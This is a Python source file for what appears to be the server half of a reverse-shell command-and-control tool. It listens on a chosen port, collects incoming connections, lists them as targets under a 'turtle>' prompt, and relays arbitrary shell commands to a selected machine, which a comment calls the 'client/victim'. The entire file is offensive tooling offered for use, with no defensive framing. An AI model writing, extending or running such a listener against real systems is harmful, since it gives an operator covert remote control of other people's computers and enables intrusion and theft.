import socket ,signal
import sys,os
import threading
import time
from queue import Queue
def listener():
    
    NUMBER_OF_THREADS = 2
    JOB_NUMBER = [1, 2]
    queue = Queue()
    all_connections = []
    all_address = []
    def controlc_signal(signal,frame):
        quit_gracefully(signal=None, frame=None)
    def register_signal_handler():
        signal.signal(signal.SIGINT, quit_gracefully)
        signal.signal(signal.SIGTERM, quit_gracefully)
        return

    def quit_gracefully(signal=None, frame=None):
        #print('\nQuitting gracefully')
        for conn in all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                break
                # continue
        s.close()
        sys.exit(0)
    # Create a Socket ( connect two computers)
    signal.signal(signal.SIGINT,controlc_signal)
    def create_socket():
        try:
            global host
            global port
            global s
            host = ""
            try:
                port = int(input("Port >> "))
            except:
                print ("Wrong !!! ")
                print ("quitting....")
                quit_gracefully(signal=None, frame=None)
            s = socket.socket()

        except socket.error as msg:
            print("Socket creation error: " + str(msg))


    # Binding the socket and listening for connections
    def bind_socket():
        try:
            global host
            global port
            global s
            print("Binding the Port: " + str(port))
            try:
                s.bind((host, port))
            except:
                print ("Port : %s already in use"%port)
                return 1
            s.listen(5)

        except socket.error as msg:
            print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
            bind_socket()


    # Handling connection from multiple clients and saving to a list
    # Closing previous connections when server.py file is restarted

    def accepting_connections():
        for c in all_connections:
            c.close()

        del all_connections[:]
        del all_address[:]

        while True:
            try:
                conn, address = s.accept()
                s.setblocking(1)  # prevents timeout

                all_connections.append(conn)
                all_address.append(address)

                print("Connection has been established :" + address[0])

            except:
                #print("Error accepting connections")
                break


    # 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
    # Interactive prompt for sending commands
    # turtle> list
    # 0 Friend-A Port
    # 1 Friend-B Port
    # 2 Friend-C Port
    # turtle> select 1
    # 192.168.0.112> dir


    def start_turtle():

        while True:
            cmd = input('turtle> ')
            if cmd == 'list':
                list_connections()
            elif 'select' in cmd:
                conn = get_target(cmd)
                if conn is not None:
                    send_target_commands(conn)
            elif cmd == 'help':
                print('''
help     show this command
list     show Target list
select   select Target such as > select 0
                ''')
            elif cmd == '':
                None
            elif cmd == 'exit' or cmd == 'quit':
                queue.task_done()
                queue.task_done()
                print('Server shutdown')
                #break
                quit_gracefully()
            else:
                print("Command not recognized")


    # Display all current active connections with client

    def list_connections():
        results = ''

        for i, conn in enumerate(all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del all_connections[i]
                del all_address[i]
                continue

            results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

        print("----Clients----" + "\n" + results)


    # Selecting the target
    def get_target(cmd):
        try:
            target = cmd.replace('select ', '')  # target = id
            target = int(target)
            conn = all_connections[target]
            print("You are now connected to :" + str(all_address[target][0]))
            print(str(all_address[target][0]) + ">", end="")
            return conn
            # 192.168.0.4> dir

        except:
            print("Selection not valid")
            return None


    # Send commands to client/victim or a friend
    def send_target_commands(conn):
        while True:
            try:
                cmd = input()
                if cmd == 'quit' or cmd == 'exit':
                    break
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")
            except:
                print("Error sending commands")
                break


    # Create worker threads
    def create_workers():
        for _ in range(NUMBER_OF_THREADS):
            t = threading.Thread(target=work)
            t.daemon = True
            t.start()


    # Do next job that is in the queue (handle connections, send commands)
    def work():
        while True:
            x = queue.get()
            if x == 1:
                create_socket()
                bind_socket()
                accepting_connections()
                break
            if x == 2:
                start_turtle()
                queue.task_done()


    def create_jobs():
        for x in JOB_NUMBER:
            queue.put(x)
        queue.join()
        
    create_workers()
    create_jobs()
